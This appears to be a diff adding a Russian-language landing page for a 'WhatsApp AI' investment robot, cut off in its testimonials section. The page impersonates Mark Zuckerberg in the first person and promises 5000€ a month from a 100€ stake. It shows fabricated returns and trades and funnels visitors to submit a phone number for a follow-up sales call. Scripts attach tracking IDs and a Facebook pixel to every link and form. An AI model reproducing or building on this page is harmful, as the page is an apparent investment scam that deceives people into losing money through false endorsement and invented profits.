@@ -1,0 +1,1937 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!---->
+		<link rel="icon" type="image/svg+xml" href="images/N67sS5uV0SXy.svg" sizes="32x32">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<link rel="stylesheet" href="css/nXVoS99s05pl.css">
+		<title>WhatsApp</title>
+		<link rel="stylesheet" href="css/gw8xUyMvCXo4.css">
+		<link rel="stylesheet" href="css/a4wYWcMRFF06.css">
+		 <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+		
+		
+		
+<script>
+    (function() {
+    function getParameterByName(name) {
+        let match = new RegExp('[?&]' + name + '=([^&]*)').exec(window.location.search);
+        return match ? decodeURIComponent(match[1]) : null;
+    }
+
+    let fbPixelId = getParameterByName('pixel');
+
+    if (fbPixelId) {
+        // Зберігаємо в localStorage, щоб передати на сторінку подяки
+        localStorage.setItem('fbPixelId', fbPixelId);
+        console.log('Facebook Pixel ID збережено в localStorage:', fbPixelId);
+    } else {
+        // Якщо в URL немає, беремо з localStorage
+        fbPixelId = localStorage.getItem('fbPixelId');
+    }
+
+    if (fbPixelId) {
+        !function(f,b,e,v,n,t,s)
+        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+        n.queue=[];t=b.createElement(e);t.async=!0;
+        t.src=v;s=b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t,s)}(window, document,'script',
+        'https://connect.facebook.net/en_US/fbevents.js');
+
+        fbq('init', fbPixelId);
+        fbq('track', 'PageView');
+    }
+})();
+</script>
+    
+    
+     <script type="application/javascript">
+  function getCookie(name) {
+    var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
+    var value = v ? v[2] : null;
+    return value && value !== "undefined" ? value : null;
+  }
+
+  function setCookie(name, value, days) {
+    var d = new Date();
+    d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
+    document.cookie = name + "=" + value + ";path=/;expires=" + d.toGMTString();
+  }
+
+  function getSubId() {
+    var params = new URLSearchParams(document.location.search.substr(1));
+    if (!"7i46eu705d".match("{")) {
+      return "7i46eu705d";
+    }
+    var clientSubid = '<?php echo isset($client) ? $client->getSubid() : "" ?>';
+    if (clientSubid && !clientSubid.match(">")) {
+      return clientSubid;
+    }
+    if (params.get("_subid")) {
+      return params.get("_subid");
+    }
+    if (params.get("subid")) {
+      return params.get("subid");
+    }
+    if (getCookie("subid")) {
+      return getCookie("subid");
+    }
+    if (getCookie("_subid")) {
+      return getCookie("_subid");
+    }
+  }
+
+  function getToken() {
+    var params = new URLSearchParams(document.location.search.substr(1));
+    if (!"uuid_7i46eu705d_7i46eu705d69452ee46bb618.92842528".match("{")) {
+      return "uuid_7i46eu705d_7i46eu705d69452ee46bb618.92842528";
+    }
+    var clientToken = '<?php echo isset($client) ? $client->getToken() : "" ?>';
+    if (clientToken && !clientToken.match(">")) {
+      return clientToken;
+    }
+    if (params.get("_token")) {
+      return params.get("_token");
+    }
+    if (params.get("token")) {
+      return params.get("token");
+    }
+    if (getCookie("token")) {
+      return getCookie("token");
+    }
+    return null;
+  }
+
+  function getPixel() {
+    var params = new URLSearchParams(document.location.search.substr(1));
+    if (!"2339839349780789".match("{")) {
+      return "2339839349780789";
+    }
+    if (params.get("pixel")) {
+      return params.get("pixel");
+    }
+
+    if (getCookie("pixel")) {
+      return getCookie("pixel");
+    }
+
+    return null;
+  }
+
+  if (typeof URLSearchParams === "function") {
+    document.addEventListener("DOMContentLoaded", function (event) {
+      var params = new URLSearchParams(document.location.search.substr(1));
+      var urlParams = new URLSearchParams(window.location.search);
+      var subid = getSubId();
+      var token = getToken();
+      var pixel = getPixel();
+
+      params.set("_token", token);
+      setCookie("pixel", pixel);
+      setCookie("token", token);
+      setCookie("subid", subid);
+      
+      // Добавляем subid в URL
+      if (!urlParams.has('subid') && subid) {
+        urlParams.set('subid', subid);
+        window.history.replaceState({}, '', window.location.pathname + '?' + urlParams.toString());
+      }
+
+      // Adds params to the links
+      document.querySelectorAll("a").forEach(function (link) {
+        try {
+          var url = new URL(link.href);
+          params.forEach(function (v, k) {
+            url.searchParams.append(k, v);
+          });
+          link.href = url.toString();
+        } catch (e) {
+          console.error(
+            `[Exception] Bad params: unexpected link '${link.href}' for new Url()`
+          );
+        }
+      });
+
+      var SUBID_TEMPLATE_NAME = "subid";
+      var TOKEN_TEMPLATE_NAME = "token";
+      var PIXEL_TEMPLATE_NAME = "pixel";
+
+      // Replace placeholders to actual values for input[hidden] fields
+      var subIdRegExp = new RegExp(`\{${SUBID_TEMPLATE_NAME}\}`, "g");
+      var tokenRegExp = new RegExp(`\{${TOKEN_TEMPLATE_NAME}\}`, "g");
+      var pixelRegExp = new RegExp(`\{${PIXEL_TEMPLATE_NAME}\}`, "g");
+
+      document
+        .querySelectorAll('input[type="hidden"]')
+        .forEach(function (input) {
+          if (subIdRegExp.test(input.value)) {
+            input.value = input.value.replaceAll(subIdRegExp, subid);
+          }
+          if (tokenRegExp.test(input.value)) {
+            input.value = input.value.replaceAll(tokenRegExp, token);
+          }
+          if (pixelRegExp.test(input.value)) {
+            input.value = input.value.replaceAll(pixelRegExp, pixel);
+          }
+        });
+
+      // Adds params as hidden inputs to the forms
+      document.querySelectorAll("form").forEach(function (form) {
+        params.forEach(function (v, k) {
+          var input = document.createElement("input");
+          input.type = "hidden";
+          input.name = k;
+          input.value = v;
+
+          form.append(input);
+        });
+      });
+    });
+  }
+</script>
+
+
+	<style>
+/* --- УНІВЕРСАЛЬНИЙ CSS ДЛЯ СТАНДАРТНОЇ АНІМАЦІЇ --- */
+        .header-main,
+        .section-three,
+        .footer {
+            position: relative;
+            overflow: hidden;
+        }
+        .header-main .container,
+        .section-three .container,
+        .footer .container {
+            position: relative;
+            z-index: 1;
+        }
+        .whatsapp-animation-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+        }
+        .whatsapp-logo {
+            position: absolute;
+            width: 50px;
+            height: 50px;
+            background-image: url('images/LrDIkvx9qsWx.svg');
+            background-size: contain;
+            background-repeat: no-repeat;
+            opacity: 0.15;
+            transition-property: transform, opacity;
+            transition-timing-function: linear;
+            will-change: transform;
+        }
+
+        /* --- ІЗОЛЬОВАНІ СТИЛІ ТІЛЬКИ ДЛЯ КАЛЬКУЛЯТОРА --- */
+        section.calculator {
+            position: relative !important;
+            overflow: hidden !important;
+        }
+        section.calculator .container {
+            position: relative !important;
+            z-index: 1 !important;
+        }
+        .calculator-animation-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+        }
+        .calculator-logo {
+            position: absolute !important;
+            width: 50px !important;
+            height: 50px !important;
+            background-image: url('images/LrDIkvx9qsWx.svg') !important;
+            background-size: contain !important;
+            background-repeat: no-repeat !important;
+            opacity: 0.15 !important;
+            transition-property: transform, opacity !important;
+            transition-timing-function: linear !important;
+            will-change: transform;
+        }
+
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	.section-wrapper {
+        display: flex;
+        justify-content: center;
+        padding: 20px 0;
+    }
+    
+    .main-container {
+        width: 100%;
+        max-width: 900px;
+        height: 65vh;
+        max-height: 550px;
+        display: flex;
+        flex-direction: column;
+        border-radius: 8px;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        overflow: hidden;
+        background-color: #f0f2f5;
+    }
+
+    .main-body {
+        flex-grow: 1;
+        background-color: #f0f2f5;
+        padding: 10px;
+        overflow: auto;
+        overflow-x: auto;
+    }
+    
+    /* --- СТИЛІ ДЛЯ ПОСТІЙНО ВИДИМОГО СКРОЛБАРУ --- */
+    
+    .main-body::-webkit-scrollbar {
+        width: 12px;
+        height: 12px;
+    }
+
+    /* Доріжка (трек) - ЗАВЖДИ ВИДИМА */
+    .main-body::-webkit-scrollbar-track {
+        background: #d8e8d8; /* Більш помітний, але все ще світлий зелений */
+        border-radius: 6px;
+        box-shadow: inset 0 0 5px rgba(0,0,0,0.1); /* Легка внутрішня тінь */
+    }
+
+    /* Повзунок (з'являється при скролі) */
+    .main-body::-webkit-scrollbar-thumb {
+        background-color: #4CAF50;
+        border-radius: 6px;
+        border: 2px solid #d8e8d8; /* Рамка кольору доріжки */
+    }
+
+    .main-body::-webkit-scrollbar-thumb:hover {
+        background-color: #45a049;
+    }
+
+    /* Стилізація для Firefox */
+    .main-body {
+        scrollbar-width: auto;
+        scrollbar-color: #4CAF50 #d8e8d8; /* Колір повзунка і колір доріжки */
+    }
+
+    /* --- СТИЛІ ДЛЯ ТАБЛИЦІ --- */
+    .table__table {
+        width: 100%;
+        border-collapse: collapse;
+        background-color: #fff;
+        min-width: 800px;
+    }
+
+    .table__table th, .table__table td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #e9edef; vertical-align: middle; }
+    .table__table th { background-color: #f8f9fa; font-weight: 600; color: #54656f; }
+    .table__table tbody tr:hover { background-color: #f5f5f5; }
+    .status-profit { color: #008000; font-weight: bold; }
+    .direction-long { color: #008000; font-weight: bold; }
+    .direction-short { color: #D32F2F; font-weight: bold; }
+    .table__body-row td:nth-child(3) { text-align: right; }
+    .profit-bubble { position: relative; display: inline-block; padding: 8px 14px; background-color: #dcf8c6; border-radius: 10px; color: #303030; font-weight: 500; margin-right: 15px; box-shadow: 0 1px 1px rgba(0, 0, 0, 0.08); }
+    .profit-bubble::after { content: ''; position: absolute; top: 50%; right: -8px; transform: translateY(-50%); width: 0; height: 0; border-top: 6px solid transparent; border-bottom: 6px solid transparent; border-left: 8px solid #dcf8c6; }
+
+    @media (max-width: 768px) {
+        
+    }
+	
+	
+	
+	
+	
+	
+	
+
+ /* 
+      -- Змінні CSS для легкого керування дизайном --
+      Ви можете змінювати ці значення, щоб налаштувати вигляд.
+    */
+    :root {
+        --bg-whatsapp-dark: #075E54;         /* Основний темно-зелений фон */
+        --accent-whatsapp-green: #25D366;    /* Яскраво-зелений для акцентів */
+        --text-color-primary: #FFFFFF;       /* Основний колір тексту */
+        --text-color-secondary: rgba(255, 255, 255, 0.85); /* Другорядний колір тексту */
+        
+        --card-border-radius: 12px;          /* Радіус заокруглення карток */
+        --card-padding: 25px;                /* Внутрішні відступи карток */
+        --container-gap: 20px;               /* Відстань між картками */
+
+        --card-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);          /* Тінь карток */
+        --card-shadow-hover: 0 8px 16px rgba(0, 0, 0, 0.3);    /* Тінь при наведенні */
+    }
+
+    .stats-container {
+        display: flex;
+        flex-direction: column; /* -- Mobile First: спочатку все в один стовпець -- */
+        gap: var(--container-gap);
+        width: 100%;
+        max-width: 1100px; /* Трохи збільшимо максимальну ширину для десктопів */
+        padding: 0 15px;   /* Додамо невеликі відступи з боків на мобільних */
+        box-sizing: border-box;
+        
+        
+          margin: 0 auto;
+    }
+
+    .stat-card {
+        background-color: var(--bg-whatsapp-dark);
+        color: var(--text-color-primary);
+        border-radius: var(--card-border-radius);
+        padding: var(--card-padding);
+        text-align: center;
+        box-shadow: var(--card-shadow);
+        transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    .stat-number {
+        font-weight: bold;
+        color: var(--accent-whatsapp-green);
+        margin-bottom: 10px;
+        line-height: 1.2;
+        /* -- Плавний шрифт: мін. 36px, макс. 48px, ідеально 5vw -- */
+        font-size: clamp(2.25rem, 5vw, 3rem); /* 1rem = 16px */
+    }
+
+    .stat-description {
+        color: var(--text-color-secondary);
+        /* -- Плавний шрифт: мін. 14px, макс. 16px, ідеально 2vw -- */
+        font-size: clamp(0.875rem, 2vw, 1rem);
+    }
+
+    /* -- Адаптивність для планшетів (і великих телефонів) -- */
+    /* Коли екран ширший за 576px, ставимо картки по дві в ряд */
+    @media (min-width: 576px) {
+        .stats-container {
+            flex-direction: row; /* Повертаємо вигляд рядка */
+            flex-wrap: wrap;     /* Дозволяємо перенесення */
+            justify-content: center;
+        }
+
+        .stat-card {
+            /* Кожна картка займає майже половину ширини (з урахуванням відступу) */
+            flex-basis: calc(50% - (var(--container-gap) / 2));
+            flex-grow: 1;
+        }
+    }
+
+    /* -- Адаптивність для десктопів -- */
+    /* Коли екран ширший за 992px, ставимо всі чотири картки в один ряд */
+    @media (min-width: 992px) {
+        .stat-card {
+            /* Кожна картка займає приблизно чверть ширини */
+            flex-basis: calc(25% - (var(--container-gap) * 3 / 4));
+        }
+    }
+
+    /* -- Ефект наведення тільки для пристроїв з мишкою -- */
+    /* Це запобігає "залипанню" ефекту на телефонах і планшетах */
+    @media (hover: hover) and (pointer: fine) {
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--card-shadow-hover);
+        }
+    }
+    
+    	</style>
+
+		<style>
+			/* Стиль для корректного ввода */
+			.iti--allow-dropdown{
+				width: 100%;
+			}
+			.valid {
+				background: #00ef0098 !important;
+				color: var(--valid-input-color) !important;
+			}
+
+			/* Стиль для некорректного ввода */
+			.invalid {
+				background: #ef000099 !important;
+				color: var(--valid-input-color) !important;
+			}
+			.input__wrapper {
+				background: #fff;
+			}
+			.iti__country-list {
+				z-index: 20 !important;
+			}
+
+			/* Чтобы кнопка-крестик была в правом верхнем углу */
+.modal-lead__content {
+  position: relative; /* Относительное позиционирование обёртки */
+}
+
+.close-modal-btn {
+  position: absolute;
+  top: 20px;     /* Отступ от верхнего края */
+  right: 20px;   /* Отступ от правого края */
+  background: none;
+  border: none;
+  cursor: pointer;
+  padding: 0;
+  color: #333;   /* Цвет иконки (через fill="currentColor") */
+  transition: color 0.2s ease;
+}
+
+.close-modal-btn:hover {
+  color: #000;   /* При наведении иконка станет чуть темнее */
+
+}
+
+
+
+
+#loadingOverlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 9999;
+}
+
+.loader-bg {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.5); /* напівпрозорий чорний */
+  backdrop-filter: blur(4px);     /* ефект блюру */
+}
+
+.loader-gif {
+  position: relative;
+  width: 100px;
+  height: auto;
+  z-index: 1;
+}
+
+
+
+
+
+
+		</style>
+		<link rel="stylesheet" href="./WhatsApp_files/intlTelInput.css">
+	<script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[" facebook.com="" ","twitter.com="" ","youtube-nocookie.com="" embed="" ","="" vk.com="" www.vk.com="" ","linkedin.com="" www.linkedin.com="" instagram.com="" www.instagram.com="" www.google.com="" recaptcha="" api2="" hangouts.google.com="" webchat="" calendar="" maps="" embed","spotify.com="" ","soundcloud.com="" player.vimeo.com="" disqus.com="" tgwidget.com="" js.driftt.com="" ","friends2follow.com","="" widget","login","="" video.bigmir.net="" ","blogger.com","="" smartlock.google.com="" keep.google.com="" web.tolstoycomments.com="" ","moz-extension:="" ","chrome-extension:="" auth="" analytics.google.com="" ","adclarity.com","paddle.com="" checkout","hcaptcha.com","recaptcha.net","2captcha.com","accounts.google.com","www.google.com="" shopping="" customerreviews","buy.tinypass.com","gstatic.com","secureir.ebaystatic.com","docs.google.com","contacts.google.com","github.com","mail.google.com","chat.google.com","audio.xpleer.com","keepa.com","static.xx.fbcdn.net","sas.selleramp.com","1plus1.video","console.googletagservices.com","="" lnkd.demdex.net="" radar.cedexis.com="" li.protechts.net="" ","challenges.cloudflare.com="" ","ogs.google.com"]"="" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/traffic.js"></script></head>
+	<body __processed_f5812f50-9756-42f4-bdfb-d3d2eb937ffa__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4yMiIsInNjb3JlIjoyMDAyMn1d" style="">
+		
+
+
+<header class="header">
+	<div class="header-top">
+		<div class="container">
+			<div class="navbar" style="padding-top: 0px; padding-bottom: 0px;">
+				<div class="logo">
+					<a class="open-modal">
+						<img src="./WhatsApp_files/ChatGPT Image 20 черв. 2025 р., 13_52_22.png" alt="logo">
+					</a>
+				</div>
+				<div class="burger open-modal">
+					<span></span>
+					<span></span>
+					<span></span>
+				</div>
+			</div>
+		</div>
+	</div>
+	
+	<!-- ОСЬ ВИПРАВЛЕНА СЕКЦІЯ -->
+	<div class="header-main">
+		<!-- 1. ЗАЛИШАЄМО ТІЛЬКИ ОДИН ПОРОЖНІЙ КОНТЕЙНЕР ДЛЯ АНІМАЦІЇ -->
+		<div class="whatsapp-animation-bg"></div>
+	
+		<!-- 2. ВАШ ОСНОВНИЙ КОНТЕНТ -->
+		<div class="container">
+			<div class="header__main">
+				<div class="header__content">
+					<h1>
+						Искусственный интеллект <h10> WhatsApp AI меняет всё.</h10> Это робот, который <h10>зарабатывает вместо вас.</h10> <br>
+						<span style="color: white; font-size: 22px;">
+							Технология, созданная при участии Марка Цукерберга, открывает путь к доходу
+							<h11 style="color: white; font-size: 22px;">от <h32 style="color: black;font-size: 27px;">5000€</h32> ежемесячно.</h11> Сделайте шаг — и будущее станет реальностью.
+						</span>
+					</h1>
+					<button class="button-link button black-btn header__button" style="letter-spacing: 2px;">
+           <span>Подключить WhatsApp AI</span>
+        </button>
+				</div>
+				<div class="header__img">
+					<img style="border-radius: 12px;" src="images/sLgdSEEZNxE4.jpeg" alt="tree">
+				</div>
+				 
+			</div>
+		
+        
+		</div>
+	</div>
+</header>
+
+
+		<section class="section-one">
+			<div class="container" bis_skin_checked="1">
+				<div class="sub" bis_skin_checked="1">О проекте</div>
+				<h2>
+					<span class="green">Это революция,</span> которая обеспечит каждому
+					<span class="green-m">необходимый заработок</span>
+				</h2>
+				<div class="section-one__main" bis_skin_checked="1">
+					<div class="section-one__img" bis_skin_checked="1">
+						<img style="border-radius: 12px;" src="images/vP4jddi00Jjr.png" alt="mark">
+					</div>
+
+					<div class="section-one__content" bis_skin_checked="1">
+						<p>
+						Я, Марк Цукерберг, один из создателей и генеральный директор WhatsApp, инициировал запуск <h12>WhatsApp AI</h12> — интеллектуального робота прямо в мессенджере, который уже помог тысячам людей выйти на стабильный доход и обрести уверенность в завтрашнем дне.
+
+Мы живём во времена, когда тысячи людей по всей Европе теряют работу из-за кризисов, автоматизации и миграции. Там, где большинство видит проблемы, я вижу возможности. <h12>WhatsApp AI</h12> открывает новый путь — доступный каждому и основанный на реальных результатах.
+
+Этот робот всё делает за вас — рассчитывает и приносит прибыль автоматически. Вам не нужно быть экспертом: всё, что требуется, — это доступ к приложению WhatsApp и несколько минут для подключения.
+
+Это не просто ещё один сервис — это умный инструмент, который возвращает людям финансовую стабильность, даёт свободу действовать независимо от обстоятельств и уверенность в будущем.
+
+Я знаю, что многие уже обжигались на громких обещаниях. Именно поэтому я создал решение, которое действительно работает — надёжно, стабильно и без лишних рисков.
+
+<h12>WhatsApp AI</h12> ждёт вас — подключитесь к интеллектуальному роботу и позвольте ему зарабатывать за вас.
+						</p>
+						
+					</div>
+				</div>
+			</div>
+		</section>
+		
+		
+		
+		
+		
+		
+        
+		
+		
+		
+	<!-- ВИПРАВЛЕНА СЕКЦІЯ -->
+<section class="section-three">
+    <!-- 1. Ось що було пропущено: контейнер для анімації -->
+    
+
+    <!-- 2. Весь ваш попередній контент залишається без змін -->
+    <div class="container" bis_skin_checked="1">
+        <h2>Лучшие результаты  <h11>WhatsApp AI</h11> за сентябрь и сделки в реальном времени</h2>
+        <ul class="section-three__content">
+            <li>
+                <div class="top-content" bis_skin_checked="1">Высокая прибыль</div>
+                <div class="head-content" bis_skin_checked="1">
+                    <img src="images/t7BZI7hK0RG3.svg" alt="st1">
+                    <div bis_skin_checked="1">
+                        <h5>BTC/USDT</h5>
+                        <div class="sub" bis_skin_checked="1">Фьючерсный grid-бот | <span>Лонг3x</span></div>
+                    </div>
+                </div>
+                <div class="main-content" bis_skin_checked="1">
+                    <div bis_skin_checked="1">
+                        <div class="name" bis_skin_checked="1">APR</div>
+                        <div class="procent" bis_skin_checked="1">1,032.43%</div>
+                    </div>
+                    <img src="images/QuzJ2jokiBZm.svg" alt="gr1">
+                </div>
+                <div class="footer-content" bis_skin_checked="1">
+                    <div class="koef" bis_skin_checked="1">
+                        <div bis_skin_checked="1">
+                            <p>Коэффициент...</p>
+                            <p class="procent-kof">21.69%</p>
+                        </div>
+                        <div bis_skin_checked="1">
+                            <p>Коэффицие...</p>
+                            <p class="procent-kof">136.58%</p>
+                        </div>
+                    </div>
+                    <a onclick="document.location.hash='';" class="cart-button">Использовать</a>
+                </div>
+            </li>
+            <li>
+                <div class="top-content" bis_skin_checked="1">Высокая прибыль</div>
+                <div class="head-content" bis_skin_checked="1">
+                    <img src="images/PiA0zj5ndbE4.svg" alt="st1">
+                    <div bis_skin_checked="1">
+                        <h5>Apple</h5>
+                        <div class="sub" bis_skin_checked="1">Фьючерсный grid-бот | <span>Лонг3x</span></div>
+                    </div>
+                </div>
+                <div class="main-content" bis_skin_checked="1">
+                    <div bis_skin_checked="1">
+                        <div class="name" bis_skin_checked="1">APR</div>
+                        <div class="procent" bis_skin_checked="1">549.76%</div>
+                    </div>
+                    <img src="images/LqjJeo9O99NF.svg" alt="gr1">
+                </div>
+                <div class="footer-content" bis_skin_checked="1">
+                    <div class="koef" bis_skin_checked="1">
+                        <div bis_skin_checked="1">
+                            <p>Коэффициент...</p>                            <p class="procent-kof">9.93%</p>
+                        </div>
+                        <div bis_skin_checked="1">
+                            <p>Коэффицие...</p>
+                            <p class="procent-kof">160.51%</p>
+                        </div>
+                    </div>
+                    <a onclick="document.location.hash='';" class="cart-button">Использовать</a>
+                </div>
+            </li>
+            <li>
+                <div class="top-content" bis_skin_checked="1">Высокая прибыль</div>
+                <div class="head-content" bis_skin_checked="1">
+                    <img src="images/IKnwGbzueBd5.svg" alt="st1">
+                    <div bis_skin_checked="1">
+                        <h5>NVIDIA</h5>
+                        <div class="sub" bis_skin_checked="1">Фьючерсный grid-бот | <span>Лонг3x</span></div>
+                    </div>
+                </div>
+                <div class="main-content" bis_skin_checked="1">
+                    <div bis_skin_checked="1">
+                        <div class="name" bis_skin_checked="1">APR</div>
+                        <div class="procent" bis_skin_checked="1">352.07%</div>
+                    </div>
+                    <img src="images/sVKIGTj19HE4.svg" alt="gr1">
+                </div>
+                <div class="footer-content" bis_skin_checked="1">
+                    <div class="koef" bis_skin_checked="1">
+                        <div bis_skin_checked="1">
+                            <p>Коэффициент...</p>
+                            <p class="procent-kof">12.88%</p>
+                        </div>
+                        <div bis_skin_checked="1">
+                            <p>Коэффицие...</p>
+                            <p class="procent-kof">128.2%</p>
+                        </div>
+                    </div>
+                    <a onclick="document.location.hash='';" class="cart-button">Использовать</a>
+                </div>
+            </li>
+        </ul>
+        <br>  
+        <h2 style="text-align: center;"> Cделки <h11>WhatsApp AI</h11> </h2>
+        <div class="section-wrapper">
+            <div class="main-container">
+                <div class="main-body">
+                    <table class="table__table">
+                        <thead>
+                            <tr>
+                                <th>Актив</th>
+                                <th>Статус</th>
+                                <th>Оплата</th>
+                                <th>Направление</th>
+                                <th>Сумма</th>
+                                <th>Время открытия</th>
+                                <th>Время закрытия</th>
+                            </tr>
+                        </thead>
+                        <tbody class="table__body">
+                            <!-- Рядки генеруються динамічно -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+ 
+
+<section class="section-two">
+			<div class="container" bis_skin_checked="1">
+				<h2>Преи<span>муще</span>ства</h2>
+				<ul class="section-two__content">
+					<li>
+						<img src="images/gqIMLZrOM2SK.svg" alt="wallet">
+						<h3>Первая прибыль уже в первую неделю</h3>
+						<p>что свидетельствует о высоком потенциале нашего проекта</p>
+					</li>
+					<li>
+						<img src="images/NpioqVBtxLVr.svg" alt="wallet">
+						<h3>Полная автоматизация всех процессов,</h3>
+						<p>
+							обеспечивающая увеличение дохода даже без опыта, позволяет
+							сосредоточиться на стратегическом развитии бизнеса
+						</p>
+					</li>
+					<li>
+						<img src="images/08T3Y9o2Oiox.svg" alt="wallet">
+						<h3>Практичность использования в любой точке мира</h3>
+						<p>делает наш продукт незаменимым для современных пользователей</p>
+					</li>
+					<li>
+						<img src="images/9PTcaJc1J5RK.svg" alt="wallet">
+						<h3>Алгоритм просчитывает 93 400 возможных событий в секунду,</h3>
+						<p>и предсказывает наиболее выгодные сделки</p>
+					</li>
+					
+				</ul>
+			</div>
+		</section>
+		
+		<br><br><br><br>
+		
+		<div class="stats-container">
+        <div class="stat-card">
+            <div class="stat-number" data-target="187">+0%</div>
+            <div class="stat-description">Среднегодовая доходность</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" data-target="78">0%</div>
+            <div class="stat-description">Процент прибыльных сделок</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" data-target="2.85">0.00</div>
+            <div class="stat-description">Коэффициент Шарпа</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" data-target="12.5">0.0%</div>
+            <div class="stat-description">Максимальная просадка</div>
+        </div>
+    </div>
+
+		
+		
+		
+		
+		
+<section class="calculator">
+    <!-- 1. ВИПРАВЛЕНО: Змінено клас на унікальний для калькулятора -->
+    
+
+    <!-- 2. Ваш існуючий контент залишається без змін -->
+    <div class="container" bis_skin_checked="1">
+        <div class="calculator__content" bis_skin_checked="1">
+            <h2>Сколько вы<span> заработаете?</span></h2>
+            <p>
+               Купив акции на сумму 100 €, вы можете получить 470 € чистой прибыли уже через несколько дней и до 5000 € в течение месяца. Вам не нужно ничего делать — за вас работает робот и приносит доход каждый день.
+            </p>
+
+            <div class="slider-container" bis_skin_checked="1">
+                <div bis_skin_checked="1"><h5>Ваша выгода:</h5></div>
+
+                <div class="slider-output" bis_skin_checked="1">
+                    <div class="investment-value" bis_skin_checked="1">€ 130</div>
+                </div>
+
+                <div class="slider-wrapper" bis_skin_checked="1">
+                    <!-- Сам ползунок -->
+                    <input type="range" id="investmentSlider" min="100" max="50000" step="1" value="100" style="background: linear-gradient(to right, rgb(171, 232, 173) 0%, rgb(216, 244, 203) 0%);">
+                    <!-- Всплывающее окошко над ползунком -->
+                    <div class="slider-tooltip" id="sliderTooltip" bis_skin_checked="1" style="left: 27.25px;">€ 100</div>
+                </div>
+
+                <div class="slider-values" bis_skin_checked="1">
+                    <span>€ 100</span>
+                    <span style="margin-left: 22px">€ 25 000</span>
+                    <span>€ 50 000</span>
+                </div>
+            </div>
+
+            <button class="button-link button black-btn" style="font-weight: 400;letter-spacing: 2px;">
+               <span> Подключить WhatsApp AI</span>
+            </button>
+        </div>
+    </div>
+</section>
+
+	<section class="section-four">
+			<div class="container" bis_skin_checked="1">
+				<div bis_skin_checked="1"><img src="images/DNGzGteTbqYs.png" alt="sec-four"></div>
+				<div class="section-four__content" bis_skin_checked="1">
+					<h2>Как начать зарабатывать?</h2>
+					<ul class="accordion">
+						<li>
+							<button class="accordion-header">
+								1. Зарегистрируйтесь
+								<span class="accordion-icon">+</span>
+							</button>
+							<div class="accordion-body" bis_skin_checked="1">
+								<p>Внимательно заполните все поля анкеты на нашем сайте.</p>
+							</div>
+						</li>
+						<li>
+							<button class="accordion-header">
+								2. Подтвердите регистрацию
+								<span class="accordion-icon">+</span>
+							</button>
+							<div class="accordion-body" bis_skin_checked="1">
+								<p>
+									Дождитесь подтверждающего звонка от специалиста на ваш
+									мобильный номер.
+								</p>
+							</div>
+						</li>
+						<li>
+							<button class="accordion-header">
+								3. Инвестируйте
+								<span class="accordion-icon">+</span>
+							</button>
+							<div class="accordion-body" bis_skin_checked="1">
+								<p>
+									Выберите сумму, которую хотите инвестировать, но не менее 100
+									€.
+								</p>
+							</div>
+						</li>
+						<li>
+							<button class="accordion-header">
+								4. Получите прибыль
+								<span class="accordion-icon">+</span>
+							</button>
+							<div class="accordion-body" bis_skin_checked="1">
+								<p>
+									Получите первую прибыль на следующий день после
+									инвестирования.
+								</p>
+							</div>
+						</li>
+					</ul>
+					<button class="button-link button black-btn" style="font-weight: 400;letter-spacing: 2px;">
+						<span>Подключить WhatsApp AI</span>
+					</button>
+				</div>
+			</div>
+		</section>
+		
+		<section class="section-six">
+			<div class="container" bis_skin_checked="1">
+				<!-- Заголовок -->
+				<section class="section-six__header">
+					<h2>
+						Что говорят <br>
+						инвесторы <br>
+						о <span>WhatsApp AI</span>
+					</h2>
+					<img src="images/EwsWLgTMRfjn.svg" alt="tr">
+				</section>
+
+				<!-- Начало слайдера Swiper -->
+				<div class="swiper swiper-initialized swiper-horizontal swiper-backface-hidden" bis_skin_checked="1">
+					<!-- Обёртка всех слайдов -->
+					<div class="swiper-wrapper" id="swiper-wrapper-ebd948c997fddc02" aria-live="polite" bis_skin_checked="1">
+						<!-- Слайд 1 -->
